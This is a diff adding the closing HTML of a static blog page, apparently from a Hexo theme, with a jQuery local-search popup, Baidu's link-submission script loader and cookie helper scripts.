+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
